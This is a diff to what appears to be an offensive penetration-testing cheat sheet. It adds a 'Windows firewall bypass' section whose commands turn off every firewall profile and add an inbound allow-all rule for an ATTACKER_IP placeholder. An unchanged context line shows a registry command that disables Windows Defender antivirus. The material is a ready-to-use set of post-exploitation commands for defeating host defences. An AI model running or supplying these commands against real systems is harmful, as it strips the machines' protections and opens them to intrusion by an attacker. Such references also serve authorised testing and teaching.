@@ -242,6 +242,27 @@ reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus
 
 
 
+
+
+
+WINDOWS FIREWALL BYPASS
+-----------------------------------------------------------------------------------------------------------------------
+Netsh Advfirewall show allprofiles
+NetSh Advfirewall set allprofiles state off
+
+# ip whitelisting
+New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
+
+
+
+
+
+
+
+
+
+
+
 MISC
 -----------------------------------------------------------------------------------------------------------------------
 use 
